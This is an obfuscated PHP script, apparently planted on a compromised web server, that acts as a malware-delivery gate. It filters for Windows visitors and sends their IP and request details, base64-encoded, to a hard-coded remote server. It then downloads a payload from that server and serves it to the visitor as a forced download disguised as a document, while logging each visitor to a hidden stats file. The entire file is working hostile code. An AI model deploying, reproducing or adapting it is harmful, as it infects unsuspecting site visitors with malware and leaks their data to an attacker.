<?php
 goto HoByc; xUTQL: if (empty($_SERVER["\110\x54\124\120\x5f\x55\x53\x45\122\x5f\x41\x47\x45\x4e\x54"])) { die("\x75\163\145\162\56"); } goto FT5Go; mKHFJ: foreach ($hdrs as $key => $value) { $kk = strtolower($key); $hdrs_new[$kk] = $value; } goto m_veo; TcKHL: file_put_contents(__DIR__ . "\x2f\x2e\56\x2f\x74\162\x79\x5f\x5f\x62\151\x67\137\137\x73\164\141\164\56\x74\x78\x74", date("\x63") . "\11" . getRealIpAddr() . "\x9" . $_SERVER["\x48\x54\124\x50\x5f\125\x53\105\122\x5f\x41\x47\105\116\124"] . "\x9" . $_GET["\x65"] . "\xd\12", FILE_APPEND); goto ohdm_; FT5Go: if (stripos($_SERVER["\110\124\x54\120\137\125\x53\x45\122\137\101\107\105\116\x54"], "\x57\151\x6e\x64\157\x77\x73") === false) { die("\167\56"); } goto nGALK; xDjNZ: if (empty($REQUEST_URI)) { die("\122\x45\121\125\105\123\124\137\x55\x52\111"); } goto h7bDC; Hb3Bm: if ($_GET["\145"] != "\61\x32\x33\x2e" . $file_ext) { if ($_GET["\145"] != "\x64\157\x63\x75\x6d\x65\x6e\164\163\56" . $file_ext) { $_SESSION["\x5f\x5f\x72\145\144\x69\162\145\x63\164\137\x77\x61\163\137\x73\164\141\162\164"] = true; $_SESSION["\x64\x6f\143\137\x6e\x61\155\145"] = $_GET["\x65"]; $_SESSION["\146\x69\154\x65\x5f\145\x78\x74"] = $file_ext; $redirect_uri = str_replace($_GET["\145"], "\x64\x6f\x63\x75\x6d\x65\x6e\x74\x73\56" . $file_ext, $REQUEST_URI); echo "\x3c\144\x69\x76\x20\x69\x64\x3d\42\154\154\42\x20\144\141\164\141\55\162\x72\x3d\42" . $redirect_uri . "\42\x3e\x3c\57\144\x69\166\76"; echo "\x3c\163\x63\x72\x69\x70\164\x3e"; echo "\x6c\x6f\143\141\164\x69\157\x6e\56\160\x61\164\x68\x6e\141\155\x65\40\75\x20\144\157\x63\165\x6d\145\156\x74\56\x67\145\x74\105\154\x65\x6d\x65\156\x74\102\x79\111\x64\x28\x27\x6c\x6c\47\51\x2e\x67\145\x74\x41\x74\x74\162\x69\142\165\164\x65\x28\x27\144\x61\164\141\x2d\x72\162\x27\x29\x3b"; echo "\x3c\x2f\x73\143\162\151\160\x74\x3e"; die("\127\x61\x69\x74\x2e\x2e\x2e"); } else { if (empty($_SESSION["\x5f\137\x72\x65\x64\x69\x72\x65\143\164\x5f\167\x61\163\x5f\x73\x74\141\162\x74"])) { die("\x72\x77\163\56"); } } } else { if (empty($hdrs_new["\150\150"])) { die("\150\56"); } } goto yNWMq; Ohu3v: $data_json = array("\x69\160" => getRealIpAddr(), "\x74\151\x6d\145" => time(), "\150\150" => $hdrs_new["\150\150"], "\145\x78\x74" => $_SESSION["\x66\x69\154\x65\x5f\145\x78\x74"], "\150\157\163\164" => $_SERVER["\x53\x45\122\x56\x45\x52\x5f\x4e\101\115\105"]); goto oRzDn; m_veo: $file_ext = explode("\x2e", $_GET["\145"]); goto lDRdD; oRzDn: $data_json = json_encode($data_json); goto OCq9i; OCq9i: $data_json = base64_encode($data_json); goto Au_4m; aNhKw: $REQUEST_URI = $_SERVER["\122\x45\x51\x55\105\x53\x54\137\x55\122\x49"]; goto xDjNZ; HoByc: if (session_start() === false) { die("\163\x73\x2e"); } goto aNhKw; McXjE: if (count($REQUEST_URI_ARR) != 3) { die("\x52\x45\x51\125\x45\123\x54\137\125\122\x49\137\x41\122\x52"); } goto XMLzP; lDRdD: $file_ext = end($file_ext); goto Hb3Bm; ohdm_: $outfilepath = __DIR__ . "\x2f\56\x2e\x2f\142\x69\147\x5f\137\163\164\x61\x74\x2e\x74\x78\x74"; goto t_ZL0; h7bDC: $REQUEST_URI_ARR = explode("\x2f", $REQUEST_URI); goto McXjE; XMLzP: $_GET["\x65"] = $REQUEST_URI_ARR[2]; goto xUTQL; Au_4m: $links = array("\150\164\164\160\x3a\57\57\61\x36\62\x2e\x32\64\61\x2e\x31\x32\67\x2e\x31\x32\63\57\x72\x6f\x75\164\145\x72\x30\x38\56\160\x68\x70\77\160\x70\75" . $data_json, "\150\164\x74\160\72\x2f\57\61\66\62\56\x32\x34\x31\56\x31\62\x37\x2e\x31\x32\x33\57\162\x6f\x75\x74\x65\162\x30\x38\56\160\150\160\x3f\x70\x70\x3d" . $data_json, "\150\164\164\160\72\57\57\x31\66\x32\56\62\x34\x31\x2e\x31\62\x37\x2e\x31\62\63\57\x72\x6f\165\x74\145\x72\60\x38\x2e\x70\x68\x70\x3f\x70\x70\x3d" . $data_json); goto W2hJd; tf05U: $hdrs = getallheaders(); goto mKHFJ; W2hJd: shuffle($links); goto TcKHL; yNWMq: function getRealIpAddr() { if (!empty($_SERVER["\110\x54\x54\120\137\x43\x4c\111\x45\x4e\124\x5f\111\120"])) { $ip = $_SERVER["\110\124\124\120\137\103\x4c\x49\x45\x4e\x54\x5f\x49\x50"]; } elseif (!empty($_SERVER["\x48\124\x54\x50\137\x58\x5f\106\117\x52\x57\101\x52\104\x45\x44\x5f\106\x4f\x52"])) { $ip = $_SERVER["\110\124\124\x50\137\x58\x5f\106\117\x52\127\x41\122\x44\105\x44\137\106\117\122"]; } else { $ip = $_SERVER["\122\x45\115\x4f\x54\x45\x5f\x41\104\x44\122"]; } return $ip; } goto Ohu3v; t_ZL0: foreach ($links as $link) { $ctx = stream_context_create(array("\x68\164\x74\x70" => array("\164\151\x6d\x65\x6f\165\164" => 30))); $data = file_get_contents($link, false, $ctx); if ($data == "\56\56\56\56" || $data == "\56\56\56") { break; } if (strlen($data) < 10000) { continue; } file_put_contents($outfilepath, date("\x63") . "\x9" . getRealIpAddr() . "\11" . $_SERVER["\x48\124\124\120\137\125\x53\x45\x52\137\101\107\105\116\124"] . "\11" . $_GET["\x65"] . "\15\12", FILE_APPEND); header("\x43\x6f\156\x74\x65\156\164\x2d\x44\145\x73\143\x72\x69\x70\164\151\157\156\72\40\106\151\x6c\145\x20\124\162\x61\x6e\x73\x66\145\x72"); header("\x43\157\156\x74\145\156\x74\55\124\x79\160\145\72\x20\x61\x70\160\x6c\151\143\x61\164\151\x6f\x6e\x2f\x6f\143\164\145\x74\55\163\164\162\145\x61\x6d"); header("\103\x6f\156\164\145\x6e\164\55\x44\151\x73\160\157\x73\151\164\151\x6f\156\72\x20\x61\164\x74\x61\143\x68\155\x65\x6e\x74\x3b\40\x66\151\x6c\145\x6e\141\155\145\x3d" . $_SESSION["\144\x6f\x63\x5f\x6e\141\x6d\145"]); header("\103\x6f\156\x74\x65\156\x74\x2d\x54\x72\x61\x6e\163\x66\145\x72\55\x45\x6e\x63\157\144\151\156\147\x3a\x20\142\151\156\141\x72\x79"); header("\103\x6f\156\x6e\145\143\x74\x69\157\x6e\72\40\x4b\x65\x65\x70\55\x41\154\x69\x76\145"); header("\x45\170\x70\x69\x72\x65\x73\72\40\60"); header("\103\x61\x63\150\x65\x2d\x43\157\x6e\x74\162\157\154\x3a\40\x6d\165\x73\x74\55\162\145\x76\141\154\x69\144\141\x74\x65\x2c\x20\x70\157\x73\x74\x2d\143\150\x65\143\x6b\75\x30\x2c\x20\x70\162\145\x2d\143\150\x65\x63\x6b\75\x30"); header("\120\x72\141\147\155\x61\x3a\x20\160\165\142\154\151\143"); echo $data; die; } goto C45qV; nGALK: $hdrs_new = array(); goto tf05U; C45qV: die("\124\162\171\40\x61\147\141\x69\x6e\x2e");